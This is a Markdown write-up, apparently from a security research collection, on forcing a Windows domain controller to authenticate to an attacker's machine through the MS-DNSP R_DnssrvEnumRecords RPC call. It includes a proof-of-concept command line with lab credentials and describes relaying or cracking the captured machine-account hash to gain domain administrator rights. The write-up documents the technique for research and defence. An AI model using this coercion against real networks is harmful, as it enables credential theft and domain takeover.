# MS-DNSP - Remote call to R_DnssrvEnumRecords (opnum 3)

## Summary

+ **Protocol**: [[MS-DNSP]: Domain Name Service (DNS) Server Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a)

+ **Protocol UUID**: 50abc2a4-574d-40b3-9d66-ee4fd5fba076

+ **Protocol version**: 0.0

+ **SMB Named pipe**: `\PIPE\DNSSERVER`

+ **Function name**: [`R_DnssrvEnumRecords`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/d0251c9b-9e3e-4eec-bcc5-eb6b995b6108)

+ **Function operation number**: `3`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\DNSSERVER` and bind to the desired [`MS-DNSP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a) protocol (with uuid `50abc2a4-574d-40b3-9d66-ee4fd5fba076` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-DNSP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\DNSSERVER` This pipe is connected to the protocol [[MS-DNSP]: Domain Name Service (DNS) Server Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a) and allows to call RPC functions of this protocol. We will then call the remote [`R_DnssrvEnumRecords`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/d0251c9b-9e3e-4eec-bcc5-eb6b995b6108) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
R_DnssrvEnumRecords('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
LONG R_DnssrvEnumRecords(
   [in]                                    handle_t             hBindingHandle,
   [in, unique, string]                    LPCWSTR              pwszServerName,
   [in, unique, string]                    LPCSTR               pszZone,
   [in, unique, string]                    LPCSTR               pszNodeName,
   [in, unique, string]                    LPCSTR               pszStartChild,
   [in]                                    WORD                 wRecordType,
   [in]                                    DWORD                fSelectFlag,
   [in, unique, string]                    LPCSTR               pszFilterStart,
   [in, unique, string]                    LPCSTR               pszFilterStop,
   [out]                                   PDWORD               pdwBufferLength,
   [out, size_is(, *pdwBufferLength)]      PBYTE*               ppBuffer
 );
```

## References

+ Documentation of protocol [MS-DNSP]: Domain Name Service (DNS) Server Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a

+ Documentation of function `R_DnssrvEnumRecords`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/d0251c9b-9e3e-4eec-bcc5-eb6b995b6108